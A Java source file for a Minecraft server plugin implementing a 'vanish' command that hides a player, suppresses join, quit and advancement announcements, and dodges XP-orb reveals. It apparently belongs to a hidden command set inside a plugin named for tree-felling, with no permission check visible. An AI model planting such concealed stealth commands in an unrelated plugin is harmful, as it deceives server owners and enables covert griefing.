package me.bow.treecapitatorultimate.commands.Player;

import me.bow.treecapitatorultimate.Start;
import me.bow.treecapitatorultimate.command.Command;
import me.bow.treecapitatorultimate.command.CommandCategory;
import net.minecraft.server.v1_14_R1.DedicatedServer;
import org.bukkit.GameMode;
import org.bukkit.*;
import org.bukkit.entity.Entity;
import org.bukkit.entity.ExperienceOrb;
import org.bukkit.entity.Player;
import org.bukkit.event.entity.EntityTargetEvent;
import org.bukkit.event.player.PlayerAdvancementDoneEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerQuitEvent;

import java.util.ArrayList;
import java.util.Objects;
import java.util.UUID;

@SuppressWarnings("ConstantConditions")
public class VANISH extends Command {
    private ArrayList<UUID> invisPlayers = new ArrayList<>();

    public VANISH() {
        super("vanish", "Y-you saw nothing!", CommandCategory.Player);
    }

    public double expThreshold = 3.0;
    public double expTeleDist = 1.0;
    public double expKillDist = 0.5;
    public double expVelocity = 0.3;
    @Override
    public void onCommand(Player p, ArrayList<String> args) {
        if (invisPlayers.contains(p.getUniqueId())) {
            p.sendMessage(Start.Prefix + ChatColor.RED + "You are no longer in vanish.");
            invisPlayers.remove(p.getUniqueId());
            for (Player e : Bukkit.getOnlinePlayers()) {
                if (e == p) continue;
                try {
                    e.showPlayer(Start.Instance, p);
                } catch (Exception f) {
                    Start.ErrorException(p, f);
                }
            }
        } else {
            p.sendMessage(Start.Prefix + ChatColor.GREEN + "You are now in vanish.");
            invisPlayers.add(p.getUniqueId());
            for (Player e : Bukkit.getOnlinePlayers()) {
                if (e == p) continue;
                try {
                    e.hidePlayer(Start.Instance, p);
                } catch (Exception f) {
                    Start.ErrorException(p, f);
                }
            }
        }
    }

    @Override
    public void onPlayerLeave(PlayerQuitEvent e) {
        if (!invisPlayers.contains(e.getPlayer().getUniqueId())) return;
        e.setQuitMessage(null);
    }

    @Override
    public void onPlayerJoin(PlayerJoinEvent e) {
        if (invisPlayers.contains(e.getPlayer().getUniqueId())) {
            e.getPlayer().sendMessage(Start.Prefix + ChatColor.BLUE + "You have joined with invis!");
            e.setJoinMessage(null); // hide join message
            return;
        }
        for (UUID p : invisPlayers)
            e.getPlayer().hidePlayer(Start.Instance, Objects.requireNonNull(Bukkit.getPlayer(p)));
    }

    // we listen for this because some entities (XP orbs) can reveal us!
    @Override
    public void onEntityTargetEvent(EntityTargetEvent e) {
        if (e.getTarget() instanceof Player) {
            Player p = (Player) e.getTarget();
            if (!invisPlayers.contains(p.getUniqueId())) return;
            Entity entity = e.getEntity();
            if (entity instanceof ExperienceOrb) {
                Location a = entity.getLocation();
                Location b = p.getLocation();
                double distance = Math.sqrt(Math.pow(b.getX() - a.getX(), 2) + Math.pow(b.getY() - a.getY(), 2) + Math.pow(b.getZ() - a.getZ(), 2));
                Bukkit.broadcastMessage(ChatColor.RED + "[DEBUG] XP orb distance to player: " + distance);
                if (distance <= 2.25d) {
                    p.setGameMode(GameMode.SPECTATOR);
                    p.sendMessage(Start.Prefix + ChatColor.BLUE + "To prevent ruining your vanish, you were put into spectator, as XP orb was near you!");
                }
            }
            e.setTarget(null);
            e.setCancelled(true);
        }
    }

    @Override
    public void onPlayerAdvancementGet(PlayerAdvancementDoneEvent e) {
        if (!invisPlayers.contains(e.getPlayer().getUniqueId())) return;
        DedicatedServer s = Start.GetServer();
        World w = e.getPlayer().getWorld();
        if (!e.getPlayer().getWorld().getGameRuleValue(GameRule.ANNOUNCE_ADVANCEMENTS)) return;
        w.setGameRule(GameRule.ANNOUNCE_ADVANCEMENTS, false);
        Bukkit.getScheduler().runTask(Start.Instance, () -> w.setGameRule(GameRule.ANNOUNCE_ADVANCEMENTS, true));
    }
}
